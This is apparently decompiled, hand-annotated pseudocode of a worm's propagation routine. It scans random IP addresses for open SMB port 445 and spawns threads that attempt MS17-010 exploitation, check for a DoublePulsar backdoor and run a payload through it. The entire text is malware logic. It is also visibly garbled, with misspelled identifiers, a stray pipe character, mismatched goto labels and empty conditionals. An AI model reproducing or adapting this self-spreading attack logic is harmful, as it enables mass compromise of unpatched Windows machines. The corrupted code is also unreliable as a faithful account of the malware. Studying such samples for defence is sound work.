int_stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance, LPSTR, intnShowCmd)
{
void *v4; //esi@1
ip_octet_3 = get_random_byte(v7) % 0xFFu;
ip_octet_2 = get_random_byte((void *)0xFF);
sprintf(&Dest, aD_D_D_D, ip_octet_2, ip_octet_3, ip_octet_4 % 0xFF);
if ( can_connect_to_port_445(v12) > 0 )
break;
IP_SCAN_LOOP:
Sleep(0x64u);
}

while ( 1 )
{
sprintf(&Dest, aD_D_D_D, ip_octet_2, ip_octet_3, this_IP);
v14 = inet_addr(&Dest);
if ( can_connect_to_port_445(v14) <= 0) |
goto NETX_IP_IN_RANGE:
v15 = (void *)beginthreadex(0, 0, MS17_010_attempt_pwn_thread, v14, 0, 0);
v16 = v15;
if ( v15 )
break;
INCREMNET_IP:
if (WaitForSingleObject(v15, 3600000u) == WAIT_TIMEOUT )
TerminateThread(v16, 0);
CloseHandle(v16)
NEXT_IP_IN_RANGE:
Sleep(50u);
goto INCREMENT_IP;
}

int _cdecl MS17_010_attempt_pwn_thread(struct in-addr in)
{
char *v1; // eax@1
signed int v2; // edi@2
char Dest; // [esp+4h] [ebp-104h]@1
char v5; // [esp+5h] [ebp-103h]@1
_int16 v6; // [esp+105h] [ebp-3h]@1
char v7; // [esp+107h] [ebp-1h]@1
Dest = 0;
memset(&v5, 0, 0x100u);
v6 = 0;
v7 = 0;
v1 = inet_Ntoa(in);
strncpy(&dest, v1, 0x10u);
if ( try_first_set_of_buffer(&Dest, 445u) )
{
v2 = 0;
do
{
Sleep(3000u);
if ( doublepulsar_installation(&Dest, 1, 445u) )
break;
Sleep(3000u);
try_second_set_of_buffers(&Dest, 445u);
++v2;
}
while ( v2 < 5 );
}
Sleep(3000u);
if ( doublepulsar_installation(&Dest, 1, 445u) );
if ( doublepulsar_run_payload(&Dest, 1, 445u) );
endthreadex(0);
return 0;
}
